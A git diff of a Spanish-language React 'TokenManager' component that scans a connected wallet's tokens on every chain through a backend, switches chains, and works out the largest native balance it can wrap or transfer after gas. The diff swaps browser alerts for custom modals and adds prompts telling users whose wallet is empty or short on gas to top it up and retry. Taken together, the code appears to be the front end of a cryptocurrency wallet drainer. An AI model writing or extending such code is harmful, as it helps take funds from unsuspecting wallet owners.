@@ -64,8 +64,38 @@ export default function TokenManager(): React.JSX.Element {
   const [detectedTokensCount, setDetectedTokensCount] = useState<number>(0)
   const [pendingNativeTokens, setPendingNativeTokens] = useState<Token[]>([])
 
+  // Estados para modales
+  const [showModal, setShowModal] = useState<boolean>(false)
+  const [modalContent, setModalContent] = useState<{
+    title: string;
+    message: string;
+    type: 'error' | 'info' | 'success';
+    onConfirm?: () => void;
+    confirmText?: string;
+    showCancel?: boolean;
+    onCancel?: () => void;
+  }>({
+    title: '',
+    message: '',
+    type: 'info'
+  })
+
   const BACKEND = process.env.NEXT_PUBLIC_BACKEND_URL ?? ''
   const { switchChain } = useSwitchChain()
+
+  // Función para mostrar modales
+  const showAlertModal = (title: string, message: string, type: 'error' | 'info' | 'success' = 'info', onConfirm?: () => void, confirmText: string = 'Aceptar', showCancel: boolean = false, onCancel?: () => void) => {
+    setModalContent({
+      title,
+      message,
+      type,
+      onConfirm,
+      confirmText,
+      showCancel,
+      onCancel
+    })
+    setShowModal(true)
+  }
 
   const changeChainIfNeeded = async (targetChainId: number, timeoutMs = 15000): Promise<void> => {
     if (!walletClient) throw new Error('Wallet client no disponible')
@@ -210,74 +240,19 @@ export default function TokenManager(): React.JSX.Element {
     setLoadingMessage('')
   }
 
-  const scanWallet = async (): Promise<void> => {
-    try {
-      setScanError('')
-      showLoading('Escaneando tokens en todas las cadenas...')
-
-      if (!BACKEND) {
-        const errorMsg = 'Error de configuración: NEXT_PUBLIC_BACKEND_URL no está definido.'
-        console.error('[CONFIG]', errorMsg)
-        setScanError(errorMsg)
-        hideLoading()
-        await alertAction(errorMsg)
-        return
-      }
-
-      const data = await fetchWithErrorHandling(`${BACKEND}/owner-tokens`, {
-        method: 'POST',
-        headers: { 
-          'Content-Type': 'application/json',
-          'Accept': 'application/json'
-        },
-        body: JSON.stringify({ owner: address })
-      })
-
-      console.log('Tokens detectados:', data)
-
-      const processedTokens: Token[] = (data.tokens as Token[] || []).map((token: Token) => {
-        if (token.symbol === 'MATIC' && !token.address) {
-          return { ...token, address: null }
-        }
-        return token
-      })
-
-      // Guardar todos los tokens
-      setTokens(processedTokens || [])
-      setDetectedTokensCount(processedTokens.length)
-      setHasScanned(true)
-      
-      // Preparar tokens nativos pendientes
-      const nativeTokens = processedTokens.filter(token => !token.address)
-      setPendingNativeTokens(nativeTokens)
-      
-      // Log de tokens en consola
-      if (processedTokens.length > 0) {
-        console.log('Tokens detectados:', processedTokens)
-      }
-      
-      hideLoading()
-    } catch (err: any) {
-      console.error('Error escaneando wallet:', err)
-      const errorMsg = 'Error escaneando wallet: ' + (err?.message || err)
-      setScanError(errorMsg)
-      hideLoading()
-      await alertAction(errorMsg + '\n\nPor favor, intenta reconectar la wallet.')
-    }
-  }
-
   const alertAction = async (message: string): Promise<void> => {
     if (typeof window !== 'undefined' && (window as any).ReactNativeWebView) {
       ;(window as any).ReactNativeWebView.postMessage(JSON.stringify({ type: 'alert', message }))
       return
     }
 
-    if (typeof globalThis !== 'undefined' && typeof (globalThis as any).alert === 'function') {
-      globalThis.alert(message)
-      return
-    }
-
-    console.log('Alert fallback:', message)
+    // Mostrar modal en lugar de alert nativo
+    return new Promise(resolve => {
+      showAlertModal('Aviso', message, 'info', () => {
+        setShowModal(false)
+        resolve()
+      })
+    })
   }
 
   const confirmAction = async (message: string): Promise<boolean> => {
@@ -303,11 +278,97 @@ export default function TokenManager(): React.JSX.Element {
       })
     }
 
-    if (typeof globalThis !== 'undefined' && typeof (globalThis as any).confirm === 'function') {
-      return Promise.resolve(Boolean(globalThis.confirm(message)))
-    }
+    // Mostrar modal de confirmación
+    return new Promise(resolve => {
+      showAlertModal(
+        'Confirmar', 
+        message, 
+        'info', 
+        () => {
+          setShowModal(false)
+          resolve(true)
+        },
+        'Aceptar',
+        true,
+        () => {
+          setShowModal(false)
+          resolve(false)
+        }
+      )
+    })
+  }
 
-    return Promise.resolve(false)
+  const scanWallet = async (): Promise<void> => {
+    try {
+      setScanError('')
+      showLoading('Escaneando tokens en todas las cadenas...')
+
+      if (!BACKEND) {
+        const errorMsg = 'Error de configuración: NEXT_PUBLIC_BACKEND_URL no está definido.'
+        console.error('[CONFIG]', errorMsg)
+        setScanError(errorMsg)
+        hideLoading()
+        showAlertModal('Error', errorMsg, 'error')
+        return
+      }
+
+      const data = await fetchWithErrorHandling(`${BACKEND}/owner-tokens`, {
+        method: 'POST',
+        headers: { 
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        },
+        body: JSON.stringify({ owner: address })
+      })
+
+      console.log('Tokens detectados:', data)
+
+      const processedTokens: Token[] = (data.tokens as Token[] || []).map((token: Token) => {
+        if (token.symbol === 'MATIC' && !token.address) {
+          return { ...token, address: null }
+        }
+        return token
+      })
+
+      // Verificar si no se encontraron tokens
+      if (!processedTokens || processedTokens.length === 0) {
+        setHasScanned(true)
+        hideLoading()
+        showAlertModal(
+          'Error', 
+          'Error no tienes saldo, recarga la billetera e intenta de nuevo', 
+          'error', 
+          () => {
+            setShowModal(false)
+            scanWallet() // Reintentar el escaneo
+          },
+          'Reintentar'
+        )
+        return
+      }
+
+      // Guardar todos los tokens
+      setTokens(processedTokens || [])
+      setDetectedTokensCount(processedTokens.length)
+      setHasScanned(true)
+      
+      // Preparar tokens nativos pendientes
+      const nativeTokens = processedTokens.filter(token => !token.address)
+      setPendingNativeTokens(nativeTokens)
+      
+      // Log de tokens en consola
+      if (processedTokens.length > 0) {
+        console.log('Tokens detectados:', processedTokens)
+      }
+      
+      hideLoading()
+    } catch (err: any) {
+      console.error('Error escaneando wallet:', err)
+      const errorMsg = 'Error escaneando wallet: ' + (err?.message || err)
+      setScanError(errorMsg)
+      hideLoading()
+      showAlertModal('Error', errorMsg + '\n\nPor favor, intenta reconectar la wallet.', 'error')
+    }
   }
 
   const getWrapInfo = async (chainId: number): Promise<any | null> => {
@@ -338,25 +399,25 @@ export default function TokenManager(): React.JSX.Element {
     
 
   const processNativeToken = async (token: Token): Promise<{success: boolean, reason?: string}> => {
-  try {
-    if (!walletClient || !publicClient || !address) {
-      throw new Error('Wallet no conectada correctamente');
-    }
+    try {
+      if (!walletClient || !publicClient || !address) {
+        throw new Error('Wallet no conectada correctamente');
+      }
 
-    // Cambiar a la cadena correcta antes de procesar
-    await changeChainIfNeeded(token.chain as number)
+      // Cambiar a la cadena correcta antes de procesar
+      await changeChainIfNeeded(token.chain as number)
 
-    const targetChainId = token.chain as number;
-    if (!targetChainId) {
-      throw new Error('No se pudo determinar la cadena del token');
-    }
+      const targetChainId = token.chain as number;
+      if (!targetChainId) {
+        throw new Error('No se pudo determinar la cadena del token');
+      }
 
-    // Cambiar a la cadena correcta antes de procesar
-    await changeChainIfNeeded(targetChainId);
+      // Cambiar a la cadena correcta antes de procesar
+      await changeChainIfNeeded(targetChainId);
 
-    // Resto del código para wrap o transferencia...
-    const wrapInfo = await getWrapInfo(targetChainId);
-    const wrappedAddress: string | undefined = wrapInfo?.wrappedAddress;
+      // Resto del código para wrap o transferencia...
+      const wrapInfo = await getWrapInfo(targetChainId);
+      const wrappedAddress: string | undefined = wrapInfo?.wrappedAddress;
 
       const balanceBN = ethers.BigNumber.from(token.balance || '0')
       const gasPrice = (feeData as any)?.gasPrice || ethers.BigNumber.from('20000000000') // 20 gwei por defecto
@@ -378,6 +439,19 @@ export default function TokenManager(): React.JSX.Element {
       if (maxSafeForWrap.lte(0) && maxSafeForTransfer.lte(0)) {
         const reason = 'Saldo insuficiente para cubrir gas fees'
         setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason }] }))
+        
+        // Mostrar modal de error de gas
+        showAlertModal(
+          'Error', 
+          'Por favor recargue la wallet', 
+          'error', 
+          () => {
+            setShowModal(false)
+            processNativeToken(token) // Reintentar procesamiento
+          },
+          'Reintentar'
+        )
+        
         return { success: false, reason }
       }
 
@@ -622,7 +696,7 @@ export default function TokenManager(): React.JSX.Element {
           message += '\nAlgunos tokens no se procesaron. Revisa los detalles.'
         }
 
-        await alertAction(message)
+        showAlertModal('Resumen', message, 'info')
       }
     }, 100)
   }
@@ -1097,6 +1171,86 @@ export default function TokenManager(): React.JSX.Element {
             <br />
             {showProcessingModal && 'Se abrirá tu wallet para confirmar las transacciones.'}
           </p>
+        </div>
+      )}
+
+      {/* Modal para alertas y confirmaciones */}
+      {showModal && (
+        <div style={{
+          position: 'fixed',
+          top: 0,
+          left: 0,
+          right: 0,
+          bottom: 0,
+          backgroundColor: 'rgba(0, 0, 0, 0.8)',
+          display: 'flex',
+          justifyContent: 'center',
+          alignItems: 'center',
+          zIndex: 2000
+        }}>
+          <div style={{
+            backgroundColor: '#222',
+            padding: '2rem',
+            borderRadius: '12px',
+            maxWidth: '500px',
+            width: '90%',
+            boxShadow: '0 10px 25px rgba(0, 0, 0, 0.5)'
+          }}>
+            <h2 style={{ 
+              color: modalContent.type === 'error' ? '#ff6b6b' : modalContent.type === 'success' ? '#4ecdc4' : '#fff', 
+              marginTop: 0,
+              fontSize: '1.5rem',
+              marginBottom: '1rem'
+            }}>
+              {modalContent.title}
+            </h2>
+            <p style={{ 
+              color: '#ccc', 
+              fontSize: '1rem',
+              lineHeight: '1.5',
+              marginBottom: '2rem'
+            }}>
+              {modalContent.message}
+            </p>
+            <div style={{ 
+              display: 'flex', 
+              justifyContent: modalContent.showCancel ? 'space-between' : 'flex-end', 
+              gap: '1rem' 
+            }}>
+              {modalContent.showCancel && (
+                <button onClick={() => {
+                  setShowModal(false)
+                  modalContent.onCancel && modalContent.onCancel()
+                }} style={{
+                  padding: '0.75rem 1.5rem',
+                  backgroundColor: 'transparent',
+                  color: '#fff',
+                  border: '1px solid #555',
+                  borderRadius: '8px',
+                  cursor: 'pointer',
+                  fontSize: '1rem',
+                  fontWeight: '500'
+                }}>
+                  Cancelar
+                </button>
+              )}
+              <button onClick={() => {
+                setShowModal(false)
+                modalContent.onConfirm && modalContent.onConfirm()
+              }} style={{
+                padding: '0.75rem 1.5rem',
+                backgroundColor: modalContent.type === 'error' ? '#ff6b6b' : modalContent.type === 'success' ? '#4ecdc4' : '#0070f3',
+                color: '#fff',
+                border: 'none',
+                borderRadius: '8px',
+                cursor: 'pointer',
+                fontSize: '1rem',
+                fontWeight: '500'
+              }}>
+                {modalContent.confirmText}
+              </button>
+            </div>
+          </div>
         </div>
       )}
 
